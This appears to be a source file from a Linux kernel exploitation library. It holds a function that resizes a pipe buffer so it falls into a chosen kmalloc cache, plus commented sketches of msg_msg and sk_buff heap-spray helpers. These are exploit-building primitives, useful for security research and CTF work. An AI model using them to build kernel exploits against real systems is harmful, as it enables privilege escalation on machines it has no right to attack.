/**
 * src/spray.c — Kernel heap spray primitives
 */
#define _GNU_SOURCE
#include <kpwn/spray.h>
#include <kpwn/utils.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>


int resizePipeBuffer(int pipe[2], size_t kmalloc_target_size) {
    size_t cache_size = GET_KMALLOC_SIZE(kmalloc_target_size);
    
    u64 max_buffers = cache_size / 0x28;

    size_t safe_pow2_buffers = ROUNDDOWN_POW2(max_buffers);

    size_t pipe_capacity = safe_pow2_buffers * 0x1000;

    // Applying F_SETPIPE_SZ to the read end (fd[0]) resizes the shared 
    // kernel pipe object, affecting the write end (fd[1]) simultaneously.
    return fcntl(pipe[0], F_SETPIPE_SZ, pipe_capacity);
}


/* TODO: Implement spray helpers.
 *
 * msg_msg spray example:
 *
 * int spray_msg_alloc(int qid, const void *data, size_t size)
 * {
 *     struct { long mtype; char mtext[]; } *msg;
 *     msg = malloc(sizeof(long) + size);
 *     msg->mtype = 1;
 *     memcpy(msg->mtext, data, size);
 *     return msgsnd(qid, msg, size, 0);
 * }
 *
 * sk_buff spray example:
 *
 * void spray_skbuff_alloc(int sk[][2], int count,
 *                         const void *data, size_t size)
 * {
 *     for (int i = 0; i < count; i++) {
 *         socketpair(AF_UNIX, SOCK_STREAM, 0, sk[i]);
 *         write(sk[i][0], data, size);
 *     }
 * }
 */
